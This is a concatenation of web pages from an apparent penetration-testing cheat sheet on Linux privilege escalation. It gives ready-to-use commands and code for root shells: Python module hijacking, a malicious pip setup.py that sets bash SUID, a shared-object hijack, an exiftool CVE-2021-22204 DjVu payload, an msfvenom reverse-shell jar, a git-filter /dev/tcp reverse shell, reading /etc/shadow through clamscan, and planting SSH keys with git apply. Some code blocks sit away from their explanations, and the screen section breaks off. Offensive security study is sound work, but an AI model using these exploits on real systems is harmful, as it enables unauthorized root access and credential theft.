# Python Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-privilege-escalation#sudo-privesc)

[Sudo PrivEscarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#sudo-privesc)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-privilege-escalation#replace-with-arbitrary-script)

[Replace with Arbitrary Scriptarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#replace-with-arbitrary-script)

Copy

    sudo -l
    
    (root) NOPASSWD: /usr/bin/python3 /home/<username>/example.py
    Copied!

If the python script is under the current user's home directory, we can remove the script and create the new one with the same name.

Copy

    rm -rf /home/<username>/example.py
    touch /home/<username>/example.py
    Copied!

We can insert arbitrary code in the new script. For example,

Copy

    import os;os.system('/bin/bash')
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-privilege-escalation#module-hijacking)

[Module Hijackingarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#module-hijacking)

Assume the python script can be executed as root with **SETENV,NOPASSWD**. For example,

Copy

    sudo -l
    
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/example.py
    Copied!

With **SETENV**, we can change **PYTHONPATH** when executing the script, and insert malicious script to the module which is imported in the script. First off, check what module is imported in the python script (e.g. /opt/example.py here).

We can forge the imported module.

The content of the module is below. This is a script that executes reverse shell. Replace `**<local-ip>**` with your local ip address.

After that, in another local terminal, start listener for getting a shell.

Then run the python script with updating **PYTHONPATH** in the remote machine.

By setting **"PYTHONPATH=/tmp/"**, the python script will import modules from **/tmp/** directories so the **"random"** module is imported from **/tmp/random.py**. Finally, we should get a shell in local terminal.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-privilege-escalation#module-overriding)

[Module Overridingarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#module-overriding)

If the Python script contains a module that can be modified by current user, we can inject arbitrary code into the module. First, check what modules the Python script uses.

Assume the **“random”** module is used in the script. Find the path of the module and check if it’s writable.

If we know we can modify it, inject arbitrary code in this module. Assume the **“random”** module path is `**/usr/lib/python3.6/random.py**`.

Then execute the Python script and we can spawn the root shell.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-privilege-escalation#os-commands-in-input)

[OS Commands in input()arrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#os-commands-in-input())

If you find the executable which is created in Python. For instance,

You can enter OS commands in some input.

For example,

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-privilege-escalation#ipython-privilege-escalation-cve-2022-21699)

[IPython Privilege Escalation (arrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#ipython-privilege-escalation-(cve-2022-21699))
[CVE-2022-21699arrow-up-right](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x)
)

Interective Python (IPython) is a command shell for interective computing in multiple programming languages.

# Pip Download Code Execution | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/pip-download-code-execution#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/pip-download-code-execution#id-1.-create-malicious-python-package)

[1\. Create Malicious Python Packagearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/#1.-create-malicious-python-package)

Reference: [https://github.com/wunderwuzzi23/this\_is\_fine\_wuzziarrow-up-right](https://github.com/wunderwuzzi23/this_is_fine_wuzzi)

Assume the package named **"exploitpy"**. We need to create **"setup.py"** in the project root, and **"init.py"**, **"main.py"** in src directory.

Copy

    mkdir exploitpy
    cd exploitpy
    touch setup.py
    mkdir src
    touch src/__init__.py
    echo 'print("hello")' > src/main.py
    Copied!

Below is the content of the **"setup.py"**. The arbitrary code is injected in the “RunCommand” method. It is executed when `**pip download**` command.

Copy

    # setup.py
    from setuptools import setup, find_packages
    from setuptools.command.install import install
    from setuptools.command.egg_info import egg_info
    
    def RunCommand():
    	# Arbitrary code here!
    	import os;os.system("chmod u+s /usr/bin/bash")
    
    class RunEggInfoCommand(egg_info):
        def run(self):
            RunCommand()
            egg_info.run(self)
    
    
    class RunInstallCommand(install):
        def run(self):
            RunCommand()
            install.run(self)
    
    setup(
        name = "exploitpy",
        version = "0.0.1",
        license = "MIT",
        packages=find_packages(),
        cmdclass={
            'install' : RunInstallCommand,
            'egg_info': RunEggInfoCommand
        },
    )
    Copied!

To package the project, run the following command in the project root.

It generates `**.tar.gz**` file in `**dist**` folder.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/pip-download-code-execution#id-2.-download-the-package)

[2\. Download the Packagearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/#2.-download-the-package)

We need to host the package using `**pypi-server**`.

Then download the package by the following command. If the pip command can be executed as root, we can also escalate privileges. When downloading, arbitrary code, that we specified in setup.py, will be executed.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/pip-download-code-execution#references)

References

*   [https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8arrow-up-right](https://medium.com/checkmarx-security/automatic-execution-of-code-upon-package-download-on-python-package-manager-cd6ed9e366a8)
    
*   [https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/arrow-up-right](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)
    

[PreviousOpenSSL Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/openssl-privilege-escalation)
[NextPolKit Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/polkit-privilege-escalation)

Last updated 2 years ago

*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/pip-download-code-execution#exploitation)
    
*   [References](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/pip-download-code-execution#references)
    

Copy

    # If you don't have modules below, install them first.
    pip3 install setuptools
    pip3 install build
    
    # Build
    python3 -m build
    Copied!

Copy

    # Install the module if you don't have it
    pip3 install pypiserver
    
    # Copy the tar.gz file into the "package" folder.
    mkdir package
    cp ./exploitpy/dist/exploitpy-0.0.1.tar.gz ./package
    pypi-server run -v -p 8000 ./package
    Copied!

Copy

    pip3 download exploitpy --index-url https://localhost:8000 -v
    Copied!

# Shared Library Hijacking | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/shared-library-hijacking#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/shared-library-hijacking/#investigation)

When we find the binary file as setuid or sudo command, check the strings of the binary file.

Copy

    strings ./example
    strace ./example
    gdb ./example
    
    ...
    foo.so
    ...
    Copied!

If the binary file uses a shared library (e.g. `**foo.so**`) and this library can be modified, we can update it and get a root shell.

Copy

    find / -type f -name "foo.so" 2>/dev/null
    ls -al /path/to/foo.so
    
    drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.so
    Copied!

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/shared-library-hijacking#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/shared-library-hijacking/#exploitation)

Create **"foo.c"**.

Then compile it to shared object.

Put the shared file to `**/path/to/foo.so**` . Now run the binary.

[PreviousSSSD Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sssd-privilege-escalation)
[NextSnapd Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/snapd-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/shared-library-hijacking#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/shared-library-hijacking#exploitation)
    

Copy

    #include <stdlib.h>
    #include <unistd.h>
    
    void foo() {
        setuid(0);
        setgid(0);
        system("/bin/bash -i");
    }
    Copied!

Copy

    gcc -shared -fPIC -nostartfiles -o foo.so foo.c
    Copied!

Copy

    ./example
    # or
    sudo ./example

# Sudo Exiftool Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/#investigation)

Copy

    (root) NOPASSWD: /usr/local/bin/exiftool
    Copied!

If we can execute **"exiftool"** command as root, we can gain access to privileges.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation#arbitrary-code-execution-cve-2021-22204-version-7.44-2b)

[Arbitrary Code Execution (CVE-2021-22204) version 7.44+arrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/#arbitrary-code-execution-(cve-2021-22204)-version-7.44%2B)

Reference: [https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/arrow-up-right](https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/)

Check the exiftool version. If the exiftool version is later than **7.44**, we can execute arbitrary code.

Copy

    exiftool -ver
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/#exploitation)

In local machine, create the payload in a file named **“exploit”**.

Copy

    (metadata "\c${system('/bin/sh')};")
    Copied!

Next, compress the file.

Copy

    bzz exploit exploit.bzz
    Copied!

Then create the DjVu file using the compressed file.

Now we have **“exploit.djvu”** file. Trasfer the file to the target machine and run exiftool as root given the DjVufile.

We should get a root shell.

[PreviousSudo Dstat Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation)
[NextSudo Fail2ban Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation#investigation)
    
*   [Arbitrary Code Execution (CVE-2021-22204) version 7.44+](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation#arbitrary-code-execution-cve-2021-22204-version-7.44-2b)
    

Copy

    sudo apt install -y djvulibre-bin
    # INFO: Create the initial information chunk.
    # BGjp: Create a JPEG background chunk.
    # ANTz: Write the compressed annotation chunk with the input file.
    djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=exploit.bzz
    Copied!

Copy

    sudo /usr/local/bin/exiftool exploit.djvu
    Copied!

---

# Sudo Java Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (root) /usr/bin/java -jar *.jar
    Copied!

If we can execute java command with arbitrary `**.jar**` file as root, we can escalate to privileges.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation#id-1.-create-a-jar-file)

[1\. Create a JAR Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/#1.-create-a-jar-file)

First, create a custom jar file in local machine. Replace `**<local-ip>**` with your local ip address.

Copy

    msfvenom -p java/shell_reverse_tcp LHOST=<local-ip> LPORT=4444 -f jar -o shell.jar
    Copied!

Then transfer the file to remote machine.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation#id-2.-reverse-shell)

[2\. Reverse Shellarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/#2.-reverse-shell)

In local machine, start a listener.

Copy

    nc -lvnp 4444
    Copied!

Now execute the java command as root in target machine.

We should get a root shell.

[PreviousSudo Git Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation)
[NextSudo OpenVPN Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation#exploitation)
    

Copy

    sudo /usr/bin/java -jar /tmp/shell.jar
    Copied!

# Sudo ClamAV Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-clamav-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/#investigation)

If we can execute **“clamscan”** command as root as below,

Copy

    sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results
    Copied!

we can read sensitive files by applying the custom yara rule.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-clamav-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-clamav-privilege-escalation#id-1.-create-a-yara-rule)

[1\. Create a Yara Rulearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/#1.-create-a-yara-rule)

First off, check the location in which the yara file can be created.

Copy

    find / -name "clam*" 2>/dev/null
    Copied!

For instance, assume we can create the yara file under **/var/lib/clamav/**. Create the yara rule in there. Assume we want to read /etc/shadow, so specify the string **“root”** because the /etc/shadow contains “root” user name.

Copy

    # /var/lib/clamav/test.yara
    rule test
    {
      strings:
        $string = "root"
      conditions:
        $string
    }
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-clamav-privilege-escalation#id-2.-execute-clamscan)

[2\. Execute ClamScanarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/#2.-execute-clamscan)

Now execute **"clamscan"** as root.

We can see **/etc/shadow** under **/tmp/results**.

[PreviousSnapd Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/snapd-privilege-escalation)
[NextSudo Dstat Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-clamav-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-clamav-privilege-escalation#exploitation)
    

Copy

    sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results
    Copied!

# Sudo Path Traversal Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-path-traversal-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (ALL) /usr/bin/node /usr/local/scripts/*.js
    Copied!

If the file path uses wildcards, we may execute arbitrary files. In short, we can refer to files in different directories which the system owner unintended.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-path-traversal-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/#exploitation)

Assume we can execute ‘node’ command as root and js file. Create the **“test.js”** under **/tmp**, which spawns a root shell after executing **‘node’** command.

Copy

    // /tmp/test.js
    require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
    Copied!

Now run **‘node’** command as root. We can pass the file using path traversal.

Copy

    sudo /usr/bin/node /usr/local/scripts/../../../tmp/test.js

[PreviousSudo OpenVPN Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-openvpn-privilege-escalation)
[NextSudo Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-path-traversal-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-path-traversal-privilege-escalation#exploitation)

# Sudo Dstat Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

**dstat** is a versatile tool for generating system resource statistics. It allows users to create a custom plugin and execute by adding option e.g. `**dstat --myplugin**`.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (ALL) NOPASSWD: /usr/bin/dstat
    Copied!

If we can execute **"dstat"** command as root, we can gain access to privileges by using our malicious plugin.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation#id-1.-create-a-new-dstat-plugin)

[1\. Create a New Dstat Pluginarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/#1.-create-a-new-dstat-plugin)

First off, find locate the **"dstat"** directory.

Copy

    find / -type d -name dstat 2>/dev/null
    Copied!

Assume the location of dstat is **“/usr/local/share/dstat”**. Create a plugin called **"dstat\_exploit.py"** under **"/usr/local/share/dstat/"**.

Copy

    import os
    
    os.system('chmod +s /usr/bin/bash')
    Copied!

dstat recognizes plugins under **"/usr/local/share/dstat/"**. Check if the above exploit plugin has been added by executing the following command.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation#id-2.-execute-dstat-with-the-malicious-plugin)

[2\. Execute Dstat with the Malicious Pluginarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/#2.-execute-dstat-with-the-malicious-plugin)

Now execute **"dstat"** with **“—exploit”** flag (the flag name is determined by the suffix of the file name e.g. **"dstat\_<plugin-name>.py"**).

The exploit plugin executed so we enter bash as root.

[PreviousSudo ClamAV Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-clamav-privilege-escalation)
[NextSudo Exiftool Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-exiftool-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation#exploitation)
    

Copy

    dstat --list | grep exploit
    Copied!

Copy

    sudo /usr/bin/dstat --exploit
    Copied!

Copy

    bash -p

---

# Sudo Git Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation#git-add-2fcommit)

[Git Add/Commitarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/#git-add%2Fcommit)

Copy

    sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A
    sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m "commit"
    Copied!

If we can commit the git repository as root, we may be able to escalate privileges.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/#exploitation)

1.  **Create a Payload**
    

Copy

    echo 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' > /tmp/revshell
    chmod +x /tmp/revshell
    Copied!

1.  **Set Git Config**
    

Copy

    # Go to the git repository
    cd /opt/example
    git init
    echo '*.php filter=indent' > .git/info/attributes
    git config filter.indent.clean /tmp/revshell
    Copied!

1.  **Commit the Repository**
    

Before committing, we need to start a listener in local machine.

Then commit with sudo.

Now we should get a shell in local terminal.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation#git-apply)

[Git Applyarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/#git-apply)

If we can apply the patch for the git repository, we can update the content of arbitrary file.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation#exploitation-with-ssh-keys)

[Exploitation with SSH Keysarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/#exploitation-with-ssh-keys)

Assume we are currently "user1" user then we want to escalate to be "user2". First we create a new SSH key.

New SSH keys (private/public) are generated under `**/home/user1**`. Next, add the content of `**id_rsa.pub**` into `**authorized_keys.**`.

Then create a patch.

After that, replace the name “user1” with “user2” in the patch file.

Now we can apply the patch as root. This command update the target user’s ("user2") `**authorization_keys**` to allow us to login with SSH key as "user2".

[PreviousSudo Fail2ban Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-fail2ban-privilege-escalation)
[NextSudo Java Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation)

Last updated 2 years ago

*   [Git Add/Commit](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation#git-add-2fcommit)
    
*   [Git Apply](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-git-privilege-escalation#git-apply)
    

Copy

    nc -lvnp 4444
    Copied!

Copy

    sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A
    sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m "commit"
    Copied!

Copy

    sudo /usr/bin/git apply *
    Copied!

Copy

    cd /home/user1
    ssh-keygen -t rsa
    Enter file in which to save the key (/home/user1/.ssh/id_rsa): id_rsa
    Copied!

Copy

    cat /home/user1/id_rsa.pub > /home/user1/.ssh/authorized_keys
    Copied!

Copy

    cd /home
    git diff user1/.bash_history user1/.ssh/authorized_keys > /tmp/patch
    Copied!

Copy

    sed -i 's/user1/user2/g' /tmp/patch
    Copied!

Copy

    sudo /usr/bin/git apply /tmp/patch
    ssh -i /home/user1/.ssh/id_rsa user2@example.com

# Sudo Screen Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-screen-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (root) /usr/bin/screen -r testsession
    Copied!

If we can execute **"screen"** command as root, we can spawn a root shell from the screen session.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-screen-privilege-escalation#exploitation)

